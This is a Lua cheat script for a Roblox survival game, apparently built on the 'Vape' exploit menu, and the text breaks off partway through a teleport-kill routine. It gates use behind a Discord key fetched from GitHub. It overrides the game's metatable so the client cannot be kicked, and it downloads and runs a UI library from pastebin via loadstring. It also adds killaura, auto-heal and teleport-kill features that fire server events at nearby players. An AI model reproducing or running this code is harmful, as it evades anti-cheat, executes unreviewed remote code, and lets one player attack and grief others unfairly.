
function getversion()
	local ver = game:HttpGet("https://raw.githubusercontent.com/RecalledVex/Sector/main/Key"):split("")
	return ver[1]..ver[2]..ver[3]..ver[4]..ver[5]..ver[6]..ver[7]..ver[8]..ver[9]..ver[10]..ver[11]..ver[12]..ver[13]..ver[14]..ver[15]
end
local key = getversion()
local json;
local HttpService = game:GetService("HttpService")

game.Workspace.FallenPartsDestroyHeight = -50000

local Beta = false

local Whitelist = {
	"TheFodikjaj",
	"F934A"
}

if table.find(Whitelist,game.Players.LocalPlayer.Name) then
	Beta = true
	print("set Beta true")
end


function KeySystem()
	local KeySystem = Instance.new("ScreenGui")
	local Paper = Instance.new("ImageLabel")
	local Description = Instance.new("TextLabel")
	local Background = Instance.new("ImageLabel")
	local Insert = Instance.new("TextBox")
	local Title = Instance.new("TextLabel")
	local Background_2 = Instance.new("ImageLabel")
	local GetKey = Instance.new("TextButton")
	local Background_3 = Instance.new("ImageLabel")
	local EnterKey = Instance.new("TextButton")

	KeySystem.Name = "KeySystem"
	KeySystem.Parent = game.CoreGui
	KeySystem.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	Paper.Name = "Paper"
	Paper.Parent = KeySystem
	Paper.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Paper.BackgroundTransparency = 1.000
	Paper.Position = UDim2.new(0.315178722, 0, 0.278080732, 0)
	Paper.Size = UDim2.new(0.36880362, 0, 0.440441549, 0)
	Paper.Image = "rbxassetid://6953899926"

	Description.Name = "Description"
	Description.Parent = Paper
	Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Description.BackgroundTransparency = 1.000
	Description.Position = UDim2.new(0.0784313828, 0, 0.263050079, 0)
	Description.Size = UDim2.new(0.843137205, 0, 0.212322205, 0)
	Description.Font = Enum.Font.FredokaOne
	Description.Text = "Join my discord for the key to inject the script"
	Description.TextColor3 = Color3.fromRGB(255, 255, 255)
	Description.TextScaled = true
	Description.TextSize = 14.000
	Description.TextStrokeTransparency = 0.700
	Description.TextWrapped = true

	Background.Name = "Background"
	Background.Parent = Paper
	Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Background.BackgroundTransparency = 1.000
	Background.Position = UDim2.new(0.0588235036, 0, 0.606718838, 0)
	Background.Size = UDim2.new(0.882353008, 0, 0.130165398, 0)
	Background.ZIndex = 3
	Background.Image = "rbxassetid://6955396514"

	Insert.Name = "Insert"
	Insert.Parent = Background
	Insert.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Insert.BackgroundTransparency = 1.000
	Insert.Position = UDim2.new(-0.00225768122, 0, 0.173598886, 0)
	Insert.Size = UDim2.new(1.00000012, 0, 0.628929853, 0)
	Insert.Font = Enum.Font.FredokaOne
	Insert.Text = ""
	Insert.TextColor3 = Color3.fromRGB(255, 255, 255)
	Insert.TextScaled = true
	Insert.TextSize = 14.000
	Insert.TextWrapped = true
	Insert.PlaceholderText = "Insert Key Here"
	Insert.PlaceholderColor3 = Color3.fromRGB(230, 230, 230)

	Title.Name = "Title"
	Title.Parent = Paper
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.Position = UDim2.new(0.0784313753, 0, 0.0811506957, 0)
	Title.Size = UDim2.new(0.843137205, 0, 0.0791207328, 0)
	Title.Font = Enum.Font.FredokaOne
	Title.Text = "Key System"
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextScaled = true
	Title.TextSize = 14.000
	Title.TextStrokeTransparency = 0.700
	Title.TextWrapped = true

	Background_2.Name = "Background"
	Background_2.Parent = Paper
	Background_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Background_2.BackgroundTransparency = 1.000
	Background_2.Position = UDim2.new(0.0588235036, 0, 0.764115632, 0)
	Background_2.Size = UDim2.new(0.43044129, 0, 0.130165398, 0)
	Background_2.ZIndex = 3
	Background_2.Image = "rbxassetid://6955396514"

	GetKey.Name = "GetKey"
	GetKey.Parent = Background_2
	GetKey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	GetKey.BackgroundTransparency = 1.000
	GetKey.Position = UDim2.new(-0.00225768122, 0, 0.173598886, 0)
	GetKey.Size = UDim2.new(1.00000012, 0, 0.628929853, 0)
	GetKey.Font = Enum.Font.FredokaOne
	GetKey.Text = "Copy Discord"
	GetKey.TextColor3 = Color3.fromRGB(255, 255, 255)
	GetKey.TextScaled = true
	GetKey.TextSize = 14.000
	GetKey.TextWrapped = true

	Background_3.Name = "Background"
	Background_3.Parent = Paper
	Background_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Background_3.BackgroundTransparency = 1.000
	Background_3.Position = UDim2.new(0.510735214, 0, 0.764115632, 0)
	Background_3.Size = UDim2.new(0.428204119, 0, 0.130165398, 0)
	Background_3.ZIndex = 3
	Background_3.Image = "rbxassetid://6955396514"

	EnterKey.Name = "EnterKey"
	EnterKey.Parent = Background_3
	EnterKey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	EnterKey.BackgroundTransparency = 1.000
	EnterKey.Position = UDim2.new(-0.00225768122, 0, 0.173598886, 0)
	EnterKey.Size = UDim2.new(1.00000012, 0, 0.628929853, 0)
	EnterKey.Font = Enum.Font.FredokaOne
	EnterKey.Text = "Enter Key"
	EnterKey.TextColor3 = Color3.fromRGB(255, 255, 255)
	EnterKey.TextScaled = true
	EnterKey.TextSize = 14.000
	EnterKey.TextWrapped = true

	EnterKey.MouseButton1Up:Connect(function()
		if Insert.Text == key then
			writefile("vapekey.txt",tostring(getversion()))
			KeySystem:Destroy()
			MainScript()
		else
			require(game.ReplicatedStorage.Modules.Client_Function_Bank).CreateNotification("Wrong Key", Color3.fromRGB(255, 0, 0), 10)
		end
	end)

	GetKey.MouseButton1Up:Connect(function()
		setclipboard("https://discord.com/invite/h3VPvdcSTC")
	end)
end

function Warning(text)
	local Warning = Instance.new("ScreenGui")
	local Paper = Instance.new("ImageLabel")
	local Description = Instance.new("TextLabel")
	local Background = Instance.new("ImageLabel")
	local Title = Instance.new("TextLabel")
	local Duration = Instance.new("TextLabel")

	Warning.Name = "Warning"
	Warning.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	Warning.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	Paper.Name = "Paper"
	Paper.Parent = Warning
	Paper.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Paper.BackgroundTransparency = 1.000
	Paper.Position = UDim2.new(0.349832237, 0, 0.314475894, 0)
	Paper.Size = UDim2.new(0.299496651, 0, 0.369384348, 0)
	Paper.Image = "rbxassetid://6953899926"

	Description.Name = "Description"
	Description.Parent = Paper
	Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Description.BackgroundTransparency = 1.000
	Description.Position = UDim2.new(0.0784313753, 0, 0.351351351, 0)
	Description.Size = UDim2.new(0.843137264, 0, 0.472972959, 0)
	Description.Font = Enum.Font.FredokaOne
	Description.Text = tostring(text)
	Description.TextColor3 = Color3.fromRGB(255, 255, 255)
	Description.TextScaled = true
	Description.TextSize = 14.000
	Description.TextStrokeTransparency = 0.700
	Description.TextWrapped = true

	Background.Name = "Background"
	Background.Parent = Paper
	Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Background.BackgroundTransparency = 1.000
	Background.Position = UDim2.new(0.0588235334, 0, 0.121621616, 0)
	Background.Size = UDim2.new(0.882352948, 0, 0.189189196, 0)
	Background.ZIndex = 0
	Background.Image = "rbxassetid://6955396514"

	Title.Name = "Title"
	Title.Parent = Background
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.Position = UDim2.new(0, 0, 0.109508693, 0)
	Title.Size = UDim2.new(1, 0, 0.747634351, 0)
	Title.Font = Enum.Font.FredokaOne
	Title.Text = "WARNING"
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextScaled = true
	Title.TextSize = 14.000
	Title.TextStrokeTransparency = 0.700
	Title.TextWrapped = true

	Duration.Name = "Duration"
	Duration.Parent = Paper
	Duration.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Duration.BackgroundTransparency = 1.000
	Duration.Position = UDim2.new(0.876750708, 0, 0.797297299, 0)
	Duration.Size = UDim2.new(0.103641465, 0, 0.171171173, 0)
	Duration.Font = Enum.Font.FredokaOne
	Duration.Text = "5"
	Duration.TextColor3 = Color3.fromRGB(255, 255, 255)
	Duration.TextScaled = true
	Duration.TextSize = 14.000
	Duration.TextStrokeTransparency = 0.700
	Duration.TextWrapped = true

	wait(1)
	Duration.Text = 4
	wait(1)
	Duration.Text = 3
	wait(1)
	Duration.Text = 2
	wait(1)
	Duration.Text = 1
	wait(1)
	Duration.Text = 0
	wait(0.05)
	Warning:Destroy()
end

local mt = getrawmetatable(game)
local old = mt.__namecall
local protect = newcclosure or protect_function

if not protect then
	protect = function(f) return f end
end

setreadonly(mt, false)
mt.__namecall = protect(function(self, ...)
	local method = getnamecallmethod()
	if method == "Kick" then
		wait(9e9)
		return
	end
	return old(self, ...)
end)
hookfunction(game:GetService("Players").LocalPlayer.Kick,protect(function() wait(9e9) end))

local Part = Instance.new("Part")
Part.Anchored = true
Part.CanCollide = true
Part.Position = Vector3.new(20000, 600, 20000)
Part.Size = Vector3.new(2048, 10, 2048)
Part.Name = "Make Terrain"
game.Workspace.Terrain:FillBlock(Part.CFrame, Part.Size, Enum.Material.Grass)
wait(0.01)
Part:Destroy()
local Mobile = false
if game:GetService("UserInputService").TouchEnabled then
	Mobile = true
end

function MainScript()
	
	local ToggleGuiLib = Instance.new("ScreenGui")
	local Paper = Instance.new("ImageLabel")
	local Background = Instance.new("ImageLabel")
	local ToggleUI = Instance.new("TextButton")

	ToggleGuiLib.Name = "ToggleGuiLib"
	ToggleGuiLib.Parent = game.CoreGui
	ToggleGuiLib.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ToggleGuiLib.Enabled = Mobile

	Paper.Name = "Paper"
	Paper.Parent = ToggleGuiLib
	Paper.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Paper.BackgroundTransparency = 1.000
	Paper.Position = UDim2.new(0.411765099, 0, 0.0186152682, 0)
	Paper.Size = UDim2.new(0.17547974, 0, 0.0825742036, 0)
	Paper.Image = "rbxassetid://6953899926"

	Background.Name = "Background"
	Background.Parent = Paper
	Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Background.BackgroundTransparency = 1.000
	Background.Position = UDim2.new(0.0425631776, 0, 0.143612698, 0)
	Background.Size = UDim2.new(0.908125579, 0, 0.701687396, 0)
	Background.ZIndex = 3
	Background.Image = "rbxassetid://6955396514"

	ToggleUI.Name = "ToggleUI"
	ToggleUI.Parent = Background
	ToggleUI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ToggleUI.BackgroundTransparency = 1.000
	ToggleUI.Position = UDim2.new(0.0222222805, 0, 0.17359902, 0)
	ToggleUI.Size = UDim2.new(0.955555439, 0, 0.628929853, 0)
	ToggleUI.Font = Enum.Font.FredokaOne
	ToggleUI.Text = "Toggle"
	ToggleUI.TextColor3 = Color3.fromRGB(255, 255, 255)
	ToggleUI.TextScaled = true
	ToggleUI.TextSize = 18.000
	ToggleUI.TextWrapped = true
	ToggleUI.TextYAlignment = Enum.TextYAlignment.Top

	shared.VapeIndependent = true
	shared.CustomSaveVape = "BoogaVape"
	local uilib = loadstring(game:HttpGet("https://pastebin.com/raw/GQYF5jdx"))()
	local GuiLibrary = shared.GuiLibrary

	require(game.ReplicatedStorage.Modules.Client_Function_Bank).CreateNotification("V1.05A", Color3.fromRGB(255, 255, 255), 10)
	require(game.ReplicatedStorage.Modules.Client_Function_Bank).CreateNotification("released on github and youtube", Color3.fromRGB(255, 255, 255), 8)

	local Combat = uilib["ObjectsThatCanBeSaved"]["CombatWindow"]["Api"]
	local Blatant = uilib["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"]
	local Render = uilib["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"]
	local Utility = uilib["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"]
	local World = uilib["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"]
	local targetinfo = shared.VapeTargetInfo

	local players = game:GetService("Players")
	local textservice = game:GetService("TextService")
	local lplr = players.LocalPlayer
	local workspace = game:GetService("Workspace")
	local lighting = game:GetService("Lighting")
	local cam = workspace.CurrentCamera
	local Animation = false

	shared.vapeteamcheck = function(plr)
		return (GuiLibrary["ObjectsThatCanBeSaved"]["Teams by colorToggle"]["Api"]["Enabled"] and (plr.Team ~= lplr.Team or (lplr.Team == nil or #lplr.Team:GetPlayers() == #game:GetService("Players"):GetChildren())) or GuiLibrary["ObjectsThatCanBeSaved"]["Teams by colorToggle"]["Api"]["Enabled"] == false)
	end

	local healthColorToPosition = {
		[Vector3.new(Color3.fromRGB(255, 28, 0).r,
			Color3.fromRGB(255, 28, 0).g,
			Color3.fromRGB(255, 28, 0).b)] = 0.1;
		[Vector3.new(Color3.fromRGB(250, 235, 0).r,
			Color3.fromRGB(250, 235, 0).g,
			Color3.fromRGB(250, 235, 0).b)] = 0.5;
		[Vector3.new(Color3.fromRGB(27, 252, 107).r,
			Color3.fromRGB(27, 252, 107).g,
			Color3.fromRGB(27, 252, 107).b)] = 0.8;
	}
	local min = 0.1
	local minColor = Color3.fromRGB(255, 28, 0)
	local max = 0.8
	local maxColor = Color3.fromRGB(27, 252, 107)

	local RenderStepTable = {}
	local StepTable = {}

	local AnimationDelay = {["Value"] = "Normal"}

	local function BindToRenderStep(name, num, func)
		if RenderStepTable[name] == nil then
			RenderStepTable[name] = game:GetService("RunService").RenderStepped:connect(func)
		end
	end
	local function UnbindFromRenderStep(name)
		if RenderStepTable[name] then
			RenderStepTable[name]:Disconnect()
			RenderStepTable[name] = nil
		end
	end

	local function BindToStepped(name, num, func)
		if StepTable[name] == nil then
			StepTable[name] = game:GetService("RunService").Stepped:connect(func)
		end
	end
	local function UnbindFromStepped(name)
		if StepTable[name] then
			StepTable[name]:Disconnect()
			StepTable[name] = nil
		end
	end
	local function runcode(func)
		func()
	end


	local function isAlive(plr)
		if plr then
			return plr and plr.Character and plr.Character.Parent ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("Humanoid")
		end
		return lplr and lplr.Character and lplr.Character.Parent ~= nil and lplr.Character:FindFirstChild("HumanoidRootPart") and lplr.Character:FindFirstChild("Head") and lplr.Character:FindFirstChild("Humanoid")
	end

	local function CalculateObjectPosition(pos)
		local newpos = cam:WorldToViewportPoint(cam.CFrame:pointToWorldSpace(cam.CFrame:pointToObjectSpace(pos)))
		return Vector2.new(newpos.X, newpos.Y)
	end

	local function CalculateLine(startVector, endVector, obj)
		local Distance = (startVector - endVector).Magnitude
		obj.Size = UDim2.new(0, Distance, 0, 2)
		obj.Position = UDim2.new(0, (startVector.X + endVector.X) / 2, 0, ((startVector.Y + endVector.Y) / 2) - 36)
		obj.Rotation = math.atan2(endVector.Y - startVector.Y, endVector.X - startVector.X) * (180 / math.pi)
	end

	local function HealthbarColorTransferFunction(healthPercent)
		if healthPercent < min then
			return minColor
		elseif healthPercent > max then
			return maxColor
		end


		local numeratorSum = Vector3.new(0,0,0)
		local denominatorSum = 0
		for colorSampleValue, samplePoint in pairs(healthColorToPosition) do
			local distance = healthPercent - samplePoint
			if distance == 0 then

				return Color3.new(colorSampleValue.x, colorSampleValue.y, colorSampleValue.z)
			else
				local wi = 1 / (distance*distance)
				numeratorSum = numeratorSum + wi * colorSampleValue
				denominatorSum = denominatorSum + wi
			end
		end
		local result = numeratorSum / denominatorSum
		return Color3.new(result.x, result.y, result.z)
	end

	local function createwarning(title, text, delay)
		pcall(function()
			local frame = GuiLibrary["CreateNotification"](title, text, delay, "assets/WarningNotification.png")
			frame.Frame.BackgroundColor3 = Color3.fromRGB(236, 129, 44)
			frame.Frame.Frame.BackgroundColor3 = Color3.fromRGB(236, 129, 44)
		end)
	end

	local function runcode(func)
		func()
	end


	local function friendCheck(plr, recolor)
		if GuiLibrary["ObjectsThatCanBeSaved"]["Use FriendsToggle"]["Api"]["Enabled"] then
			local friend = (table.find(GuiLibrary["ObjectsThatCanBeSaved"]["FriendsListTextCircleList"]["Api"]["ObjectList"], plr.Name) and GuiLibrary["ObjectsThatCanBeSaved"]["FriendsListTextCircleList"]["Api"]["ObjectListEnabled"][table.find(GuiLibrary["ObjectsThatCanBeSaved"]["FriendsListTextCircleList"]["Api"]["ObjectList"], plr.Name)] and true or nil)
			if recolor then
				return (friend and GuiLibrary["ObjectsThatCanBeSaved"]["Recolor visualsToggle"]["Api"]["Enabled"] and true or nil)
			else
				return friend
			end
		end
		return nil
	end


	local function getPlayerColor(plr)
		return (friendCheck(plr, true) and Color3.fromHSV(GuiLibrary["ObjectsThatCanBeSaved"]["Friends ColorSliderColor"]["Api"]["Hue"], GuiLibrary["ObjectsThatCanBeSaved"]["Friends ColorSliderColor"]["Api"]["Sat"], GuiLibrary["ObjectsThatCanBeSaved"]["Friends ColorSliderColor"]["Api"]["Value"]) or tostring(plr.TeamColor) ~= "White" and plr.TeamColor.Color)
	end

	local function isPlayerTargetable(plr, target, friend)
		return plr ~= lplr and plr and (friend and friendCheck(plr) == nil or (not friend)) and isAlive(plr) and shared.vapeteamcheck(plr)
	end

	local function GetNearestHumanoidToPosition(player, distance)
		local closest, returnedplayer = distance, nil
		if isAlive() then
			for i, v in pairs(players:GetChildren()) do
				if isPlayerTargetable((player and v or nil), true, true) and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Head") then
					local mag = (lplr.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude
					if mag <= closest then
						closest = mag
						returnedplayer = v
					end
				end
			end
		end
		return returnedplayer
	end

	runcode(function()
		local killaurabox = Instance.new("BoxHandleAdornment")
		killaurabox.Transparency = 0.7
		killaurabox.Color3 = Color3.new(1, 0, 0)
		killaurabox.Adornee = nil
		killaurabox.AlwaysOnTop = true
		killaurabox.Size = Vector3.new(3, 6, 3)
		killaurabox.ZIndex = 11
		killaurabox.Parent = GuiLibrary["MainGui"]

		local autoclickertick = tick()
		local KillAuraTargetFrame = {["Players"] = {["Enabled"] = false}}
		local KillAura = {["Enabled"] = false}
		local TeamCheck = {["Value"] = false}
		local SlashAnimation = {["Value"] = false}
		local killauratarget = {["Value"] = false}
		local KillCPS = {["GetRandomValue"] = function() return 1 end}
		local KillAuraRange = {["Value"] = 5}
		local ItemData = require(game:GetService("ReplicatedStorage").Modules.ItemData)
		KillAura = GuiLibrary["ObjectsThatCanBeSaved"]["CombatWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Killaura",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						while game:GetService("RunService").Heartbeat:Wait() and KillAura.Enabled == true and game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= 0 do

							wait(1 / KillCPS["GetRandomValue"]())

							for i,enemy in pairs(game.Players:GetPlayers()) do
								if enemy.Character and enemy.Character:FindFirstChild("Humanoid") 
									and enemy.Character.Humanoid.Health >= 0 
									and enemy.Character:FindFirstChild("HumanoidRootPart") 
									and enemy.Name ~= game.Players.LocalPlayer.Name
									and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - enemy.Character.HumanoidRootPart.Position).Magnitude <= KillAuraRange.Value 
								then


									local targettable = {}
									targettable[enemy.Name] = {
										["UserId"] = enemy.UserId,
										["Health"] = enemy.Character.Humanoid.Health,
										["MaxHealth"] = enemy.Character.Humanoid.MaxHealth
									}

									targetinfo.UpdateInfo(targettable, 1)
									for _,part in pairs(enemy.Character:GetChildren()) do
										if part.ClassName == "Part" or part.ClassName == "MeshPart" then

											for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
												if v.ClassName == "Model" then
													if ItemData[v.Name].useType == "Slash" then

														if killauratarget["Enabled"] and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - enemy.Character.HumanoidRootPart.Position).Magnitude <= KillAuraRange.Value  then
															killaurabox.Adornee = (killauratarget["Enabled"] and enemy.Character or nil)
														else
															killaurabox.Adornee = nil
														end

														if SlashAnimation.Value == false then
															local one = game:GetService("ReplicatedStorage").RelativeTime.Value
															local two = {part,part,part,part}
															game:GetService("ReplicatedStorage").Events.SwingTool:FireServer(one, two)
														else

															local one = game:GetService("ReplicatedStorage").RelativeTime.Value
															local two = {part,part,part,part}
															game:GetService("ReplicatedStorage").Events.SwingTool:FireServer(one, two)

															if Animation == false then
																Animation = true
																local animation = game.ReplicatedStorage.Animations:WaitForChild('Slash')
																local humanoid = game.Players.LocalPlayer.Character:WaitForChild('Humanoid')
																local dance = humanoid:LoadAnimation(animation)
																dance:Play()
															end
														end
													end
												end
											end
										end
									end
								end
							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "Hit people in your radius",
			["Default"] = false,
			
		})

		KillAuraTargetFrame = KillAura.CreateTargetWindow({["Default3"] = true})
		AnimationDelay = KillAura.CreateDropdown({
			["Name"] = "Mode",
			["List"] = {"Normal", "Fast", "Slow"},
			["Function"] = function(val) 
			end
		})
		KillAuraRange = KillAura.CreateSlider({
			["Name"] = "Distance",
			["Min"] = 1,
			["Max"] = 15,
			["Function"] = function(val)
			end,
			["HoverText"] = "changes the range of the kill aura",
			["Default"] = 15
		})
		KillCPS = KillAura.CreateTwoSlider({
			["Name"] = "CPS",
			["Min"] = 1,
			["Max"] = 15, 
			["Default"] = 5,
			["Default2"] = 7
		})
		SlashAnimation = KillAura.CreateToggle({
			["Name"] = "Animations", 
			["Function"] = function() end,
			["Default"] = true
		})
		killauratarget = KillAura.CreateToggle({
			["Name"] = "Show target",
			["Function"] = function() end,
			["HoverText"] = "Shows a red box over the opponent."
		})
	end)

	runcode(function()
		local AutoWeapon = {["Enabled"] = false}
		local RangeToEquip = {["Value"] = 15}
		local ToolSlot = {["Value"] = 3}
		AutoWeapon = GuiLibrary["ObjectsThatCanBeSaved"]["CombatWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoWeapon",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						while game:GetService("RunService").Heartbeat:Wait() and AutoWeapon.Enabled == true and game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= 0 do
							wait()

							for i,enemy in pairs(game.Players:GetPlayers()) do
								if enemy.Character and enemy.Character:FindFirstChild("Humanoid") 
									and enemy.Character.Humanoid.Health >= 0 
									and enemy.Character:FindFirstChild("HumanoidRootPart") 
									and enemy.Name ~= game.Players.LocalPlayer.Name
									and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - enemy.Character.HumanoidRootPart.Position).Magnitude <= RangeToEquip.Value 
								then

									local targettable = {}
									targettable[enemy.Name] = {
										["UserId"] = enemy.UserId,
										["Health"] = enemy.Character.Humanoid.Health,
										["MaxHealth"] = enemy.Character.Humanoid.MaxHealth
									}
									targetinfo.UpdateInfo(targettable, 1)
									
									if game.Players.LocalPlayer.PlayerGui.MainGui.Panels.Toolbar.List:FindFirstChild(tostring(ToolSlot.Value)).ImageColor3 ~= Color3.fromRGB(170, 255, 0) then
										game.ReplicatedStorage.Events.EquipTool:FireServer(tonumber(ToolSlot.Value))
									end
								end
							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "teleport to haven portal",
			["Default"] = false,
			["ExtraText"] = function() return "" end
		})
		RangeToEquip = AutoWeapon.CreateSlider({
			["Name"] = "Distance",
			["Min"] = 1,
			["Max"] = 15,
			["Function"] = function(val)
			end,
			["Default"] = 15
		})
		ToolSlot = AutoWeapon.CreateSlider({
			["Name"] = "ToolSlot",
			["Min"] = 1,
			["Max"] = 6,
			["Function"] = function(val)
			end,
			["Default"] = 3
		})
	end)

	runcode(function()
		local AutoArmor = {["Enabled"] = false}
		local Armor1 = {["Value"] = ""}
		local Armor2 = {["Value"] = ""}
		local Armor3 = {["Value"] = ""}
		AutoArmor = GuiLibrary["ObjectsThatCanBeSaved"]["CombatWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoArmor",
			["Function"] = function(callback)
				if callback then
					spawn(function()

						game:GetService("ReplicatedStorage").Events.UseBagItem:FireServer(Armor1.Value)
						wait(0.1)
						game:GetService("ReplicatedStorage").Events.UseBagItem:FireServer(Armor2.Value)
						wait(0.1)
						game:GetService("ReplicatedStorage").Events.UseBagItem:FireServer(Armor3.Value)
						wait(0.05)
						AutoArmor["ToggleButton"](false)
					end)
				else
				end
			end,
			["HoverText"] = "teleport to haven portal",
			["Default"] = false,
			["ExtraText"] = function() return "" end
		})
		Armor1 = AutoArmor.CreateTextBox({
			["Name"] = "Armor",
			["TempText"] = "Armor Name",
			["HoverText"] = "put the name of the armor"
		})
		Armor2 = AutoArmor.CreateTextBox({
			["Name"] = "Armor",
			["TempText"] = "Armor Name",
			["HoverText"] = "put the name of the armor"
		})
		Armor3 = AutoArmor.CreateTextBox({
			["Name"] = "Armor",
			["TempText"] = "Armor Name",
			["HoverText"] = "put the name of the armor"
		})

	end)
	
	
	runcode(function()
		local CheckHealth = {["Enabled"] = false}
		local HealthDue = {["Value"] = 70}
		local CheckTimer = {["Value"] = false}
		local CheckHealthMethod = {["Value"] = "Teleport"}
		local Timer = game.Players.LocalPlayer.PlayerGui.MainGui.Panels.Toolbar.Stats.PlayerStats.CombatStopwatch.Countdown
		CheckHealth = GuiLibrary["ObjectsThatCanBeSaved"]["CombatWindow"]["Api"].CreateOptionsButton({
			["Name"] = "CheckHealth",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						while game:GetService("RunService").Heartbeat:Wait() and CheckHealth.Enabled == true and isAlive(game.Players.LocalPlayer) and game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= 0 do
							if game.Players.LocalPlayer.Character.Humanoid.Health <= HealthDue.Value then
								if CheckHealthMethod.Value == "Teleport" then
										local r = math.random(1,3)
										if r == 1 then
											game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1022, -4.5, -808)	
											wait(5)
										end
										if r == 2 then
											game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1145, 21, 1252)	
											wait(5)
										end
										if r == 3 then
											wait(5)
											game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-70.602, 219.301, -617.171)	
										end
									end
							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "Heals yourself and you need to choose the item you want to eat",
			["Default"] = false,
			
		})
		
		CheckHealthMethod = CheckHealth.CreateDropdown({
			["Name"] = "Mode",
			["List"] = {"Teleport"},
			["Function"] = function(val) 
			end
		})

		HealthDue = CheckHealth.CreateSlider({
			["Name"] = "Health Check",
			["Min"] = 1,
			["Max"] = 99, 
			["Function"] = function() end,
			["Default"] = 20,
			["HoverText"] = "Checks your health",
		})

	end)

	runcode(function()
		local AutoHeal = {["Enabled"] = false}
		local HealthMustBe = {["Value"] = 70}
		local AutoHealItem = {["Value"] = ""}
		AutoHeal = GuiLibrary["ObjectsThatCanBeSaved"]["CombatWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoHeal",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						while game:GetService("RunService").Heartbeat:Wait() and AutoHeal.Enabled == true and isAlive(game.Players.LocalPlayer) and game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= 0 do
							if game.Players.LocalPlayer.Character.Humanoid.Health <= HealthMustBe.Value then
								game:GetService("ReplicatedStorage").Events.UseBagItem:FireServer(AutoHealItem.Value)
							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "Heals yourself and you need to choose the item you want to eat",
			["Default"] = false,
			
		})

		HealthMustBe = AutoHeal.CreateSlider({
			["Name"] = "Health Check",
			["Min"] = 1,
			["Max"] = 99, 
			["Function"] = function() end,
			["Default"] = 70,
			["HoverText"] = "Checks your health",
		})
		AutoHealItem = AutoHeal.CreateTextBox({
			["Name"] = "Item",
			["TempText"] = "Item Name",
			["HoverText"] = "the item you want to heal"
		})

	end)


	runcode(function()
		local TeleportKill = {["Enabled"] = false}
		local RandomizeKill = {["Value"] = false}
		local MethodToKill = {["Value"] = "LookVector"}
		local KillName = {["Value"] = ""}
		local OffsetX = {["Value"] = 20}
		local OffsetY = {["Value"] = 20}
		local isHitting = false
		local Target = nil

		function GetPlayer(String)
			local plr
			local strl = String:lower()
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name:lower():sub(1, #String) == String:lower() then
					plr = v
				end
			end
			return plr    
		end		


		TeleportKill = GuiLibrary["ObjectsThatCanBeSaved"]["CombatWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Teleport Kill",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						local char = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name)
						local hum = char:FindFirstChild("HumanoidRootPart")
						while game:GetService("RunService").Heartbeat:Wait() and TeleportKill.Enabled == true and game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= 0 do
							if RandomizeKill.Value == "Randomize" then
								for i,v in pairs(game.Players:GetChildren()) do
									if v.Name ~= game.Players.LocalPlayer.Name and isAlive(v) and isHitting == false and v.Character ~= game.Workspace.Characters then
										local enemyHum = v.Character.HumanoidRootPart
										isHitting = true
										Target = v.Name

										repeat game:GetService("RunService").Heartbeat:Wait()
											hum.CFrame = CFrame.new(enemyHum.Position - enemyHum.CFrame.lookVector * OffsetX.Value / 10 + Vector3.new(0, OffsetY.Value / 10, 0))
										until RandomizeKill.Value ~= "Randomize" or TeleportKill.Enabled == false
										wait(1)
										isHitting = false
									end
								end
							end

							if RandomizeKill.Value == "Custom" then
